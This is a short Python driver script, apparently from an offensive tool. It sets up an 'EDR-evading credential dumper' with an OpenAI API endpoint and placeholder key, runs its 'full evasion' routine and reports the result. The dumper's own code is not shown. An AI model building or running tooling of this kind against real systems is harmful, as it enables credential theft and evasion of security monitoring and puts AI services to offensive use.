from ..operations.credential_dumper import EDREvadingCredentialDumper

def demonstrate_ai_evasion():
    api_endpoint = "https://api.openai.com/v1/chat/completions"
    api_key = "sk-..."  # replace

    dumper = EDREvadingCredentialDumper(
        api_endpoint=api_endpoint,
        api_key=api_key
    )
    success = dumper.execute_with_full_evasion()
    print("\n[+] Demo completed" if success else "\n[!] Demo failed")

if __name__ == "__main__":
    demonstrate_ai_evasion()